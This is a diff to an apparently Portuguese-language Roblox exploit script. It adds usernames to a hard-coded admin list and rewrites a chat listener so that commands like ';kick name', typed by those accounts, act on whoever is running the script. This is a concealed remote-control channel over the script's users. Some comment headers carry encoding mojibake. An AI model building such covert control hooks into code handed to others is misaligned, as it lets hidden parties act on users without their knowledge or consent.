@@ -76,7 +76,7 @@ local localPlayer = Players.LocalPlayer
 
 -- [[ CONTROLO DE ADMINISTRAÃ‡ÃƒO ]]
 
-local AdminNames = {"Bolsonaro_Jair7", "vl2445", "Sarah_Becca19", "naruto35225", "wuwau7w8q8q", "}
+local AdminNames = {"Bolsonaro_Jair7", "vl2445", "Sarah_Becca19", "naruto35225", "wuwau7w8q8q", "amodeus12359", "Lucas12345675758"}
 local SpinPlayers = {}
 local CaixaPlayers = {}
 _G.KillLoopPlayers = {}
@@ -363,30 +363,14 @@ TextChatService.MessageReceived:Connect(function(msg)
         return 
     end
 
-    local cmd, partialTarget = text:match("^;(.-)%s+([^%s]+)$")
+    -- 4. CAPTURA DE COMANDOS COM ALVO (;comando alvo)
+    local cmd, target = text:match("^;(.-)%s+([^%s]+)$")
     
-    if cmd and partialTarget then
-        -- LÓGICA DE BUSCA POR NOME MINIMIZADO
-        local victim = nil
-        
-        -- Se o alvo for "todos", a vítima é você mesmo (para execução em massa)
-        if partialTarget == "todos" then
-            victim = localPlayer
-        else
-            -- Procura na lista de players quem começa com as letras digitadas
-            for _, p in pairs(Players:GetPlayers()) do
-                if p.Name:lower():sub(1, #partialTarget) == partialTarget then
-                    victim = p
-                    break
-                end
-            end
-        end
-
-        -- SÓ EXECUTA SE VOCÊ FOR A VÍTIMA ENCONTRADA
-        if victim == localPlayer then
-            local char = localPlayer.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    -- So executa se o alvo da mensagem for Você (o dono do script)
+    if cmd and target and target == localPlayer.Name:lower() then
+        local char = localPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
 
         -- [[ COMANDO: KICK ]]
         if cmd == "kick" then
@@ -6355,6 +6339,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
